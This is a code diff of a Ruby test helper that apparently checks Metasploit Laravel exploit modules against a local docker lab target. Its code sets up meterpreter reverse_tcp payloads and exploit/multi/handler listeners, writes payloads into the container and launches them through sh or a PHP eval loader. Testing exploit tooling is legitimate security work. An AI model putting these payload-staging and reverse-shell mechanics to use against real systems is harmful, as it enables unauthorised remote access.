@@ -17,6 +17,22 @@ module LaravelSessions
     'fetch' => [1, 'cmd/linux/http/x64/meterpreter/reverse_tcp', 'meterpreter']
   }.freeze
 
+  def session_families
+    FAMILIES
+  end
+
+  def session_exec_options
+    []
+  end
+
+  def session_exec_argv(*command, detached: false)
+    target_runtime.fetch('compose') + ['exec', '-T'] + (detached ? ['-d'] : []) + session_exec_options + ['target', *command]
+  end
+
+  def session_default_options
+    { 'staged' => %w[TARGET PAYLOAD], 'fetch' => ['PAYLOAD'] }
+  end
+
   def session_fetch_path
     "/tmp/module-target-#{laravel_component}-fetch-#{Process.pid}"
   end
@@ -111,7 +127,7 @@ module LaravelSessions
   def callback_control
     server = TCPServer.new('0.0.0.0', CALLBACK_PORT)
     token = laravel_component + '-' + Rex::Text.rand_text_alphanumeric(24)
-    command = target_runtime.fetch('compose') + ['exec', '-T', 'target', 'php', '/opt/module-target-callback.php', token, CALLBACK_PORT.to_s]
+    command = session_exec_argv('php', '/opt/module-target-callback.php', token, CALLBACK_PORT.to_s)
     task = Thread.new { Open3.capture3(*command) }
     task.report_on_exception = false
     raise Timeout::Error, 'No native callback' unless IO.select([server], nil, nil, 8)
@@ -152,7 +168,7 @@ module LaravelSessions
   end
 
   def use_session(family, attempt, owner)
-    _target, payload, type = FAMILIES.fetch(family)
+    _target, payload, type = session_families.fetch(family)
     metadata = await_session(payload, owner)
     attempt[:metadata] = metadata
     identifier = metadata.fetch('id')
@@ -193,7 +209,7 @@ module LaravelSessions
   end
 
   def native_session(family)
-    _target, payload, = FAMILIES.fetch(family)
+    _target, payload, = session_families.fetch(family)
     attempt = { family: family, owner: 'exploit/multi/handler', payload: payload }
     @rc[:attempts] << attempt
     interpreter = { 'bash-shell' => 'bash', 'fetch' => 'curl' }.fetch(family, 'php')
@@ -204,7 +220,7 @@ module LaravelSessions
     expect(file(source)).to include('exists' => false)
     console_command('back')
     console_command('use exploit/multi/handler')
-    { 'PAYLOAD' => payload, 'LHOST' => @listener_host, 'LPORT' => CALLBACK_PORT, 'ReverseListenerBindAddress' => '0.0.0.0', 'ExitOnSession' => false, 'ListenerTimeout' => 60 }.merge(FAMILIES.fetch(family)[2] == 'meterpreter' ? { 'SessionCommunicationTimeout' => 10, 'SessionExpirationTimeout' => 90 } : {}).merge(session_payload_options(family)).each do |key, value|
+    { 'PAYLOAD' => payload, 'LHOST' => @listener_host, 'LPORT' => CALLBACK_PORT, 'ReverseListenerBindAddress' => '0.0.0.0', 'ExitOnSession' => false, 'ListenerTimeout' => 60 }.merge(session_families.fetch(family)[2] == 'meterpreter' ? { 'SessionCommunicationTimeout' => 10, 'SessionExpirationTimeout' => 90 } : {}).merge(session_payload_options(family)).each do |key, value|
       expect(console_command("set #{key} #{value}")).not_to include('Unknown datastore option')
     end
     attempt[:handler_output] = console_command('run -j -z')
@@ -213,11 +229,11 @@ module LaravelSessions
     expect(generated.fetch('payload')).to eq(payload)
     attempt[:generated] = generated
     code = Base64.strict_decode64(generated.fetch('encoded'))
-    output, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'exec', '-T', 'target', 'sh', '-c', 'cat > "$1"; chmod 600 "$1"; sha256sum "$1"', 'native-script', source, stdin_data: code)
+    output, error, status = Open3.capture3(*session_exec_argv('sh', '-c', 'cat > "$1"; chmod 600 "$1"; sha256sum "$1"', 'native-script', source), stdin_data: code)
     expect(status.success?).to be(true), error
     expect(output.split.first).to eq(Digest::SHA256.hexdigest(code))
-    launch = FAMILIES.fetch(family).first == 1 ? ['sh', source] : ['php', '-r', 'eval(file_get_contents($argv[1]));', source]
-    output, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'exec', '-T', '-d', 'target', 'sh', '-c', 'output=$1; shift; exec "$@" > "$output" 2>&1', 'native-launch', log_path, *launch)
+    launch = payload.start_with?('cmd/') ? ['sh', source] : ['php', '-r', 'eval(file_get_contents($argv[1]));', source]
+    output, error, status = Open3.capture3(*session_exec_argv('sh', '-c', 'output=$1; shift; exec "$@" > "$output" 2>&1', 'native-launch', log_path, *launch, detached: true))
     attempt[:launch] = { argv: launch, stdout: output, stderr: error, exit: status.exitstatus }
     expect(status.success?).to be(true), error
     use_session(family, attempt, 'exploit/multi/handler')
@@ -240,12 +256,12 @@ module LaravelSessions
   end
 
   def owner_session(family)
-    target, payload, = FAMILIES.fetch(family)
+    target, payload, = session_families.fetch(family)
     2.times do |iteration|
-      options = { 'TARGET' => target, 'PAYLOAD' => payload, 'SSL' => false, 'LHOST' => @listener_host, 'LPORT' => CALLBACK_PORT, 'ReverseListenerBindAddress' => '0.0.0.0', 'AutoCheck' => iteration.zero?, 'ForceExploit' => false, 'DisablePayloadHandler' => false, 'WfsDelay' => 12, 'HttpClientTimeout' => 3 }.merge(FAMILIES.fetch(family)[2] == 'meterpreter' ? { 'SessionCommunicationTimeout' => 10, 'SessionExpirationTimeout' => 90 } : {}).merge(session_payload_options(family))
-      select_defaults = %w[staged fetch].include?(family) && iteration.zero?
-      options = options.except('PAYLOAD') if select_defaults
-      options = options.except('TARGET') if select_defaults && family == 'staged'
+      options = { 'TARGET' => target, 'PAYLOAD' => payload, 'SSL' => false, 'LHOST' => @listener_host, 'LPORT' => CALLBACK_PORT, 'ReverseListenerBindAddress' => '0.0.0.0', 'AutoCheck' => iteration.zero?, 'ForceExploit' => false, 'DisablePayloadHandler' => false, 'WfsDelay' => 12, 'HttpClientTimeout' => 3 }.merge(session_families.fetch(family)[2] == 'meterpreter' ? { 'SessionCommunicationTimeout' => 10, 'SessionExpirationTimeout' => 90 } : {}).merge(session_payload_options(family))
+      omitted = iteration.zero? ? session_default_options.fetch(family, []) : []
+      select_defaults = omitted.any?
+      options = options.except(*omitted)
       attempt = { family: family, owner: laravel_owner, payload: payload, iteration: iteration, select_defaults: select_defaults, options: options }
       @rc[:attempts] << attempt
       output = run_target_module(laravel_owner, 'target', options, action: 'run -z', reuse_module: iteration.positive?, allow_errors: true, command_timeout: 50)
@@ -254,6 +270,8 @@ module LaravelSessions
       attempt[:selection] = selection
       expect(selection.fetch('object')).to eq(@owner_selection) if iteration.positive?
       @owner_selection = selection.fetch('object')
+      expect(selection.fetch('target').to_i).to eq(target)
+      expect(selection.fetch('payload')).to eq(payload)
       expect(output).not_to include('Exploit failed', 'Exploit aborted')
       use_session(family, attempt, laravel_owner)
     ensure
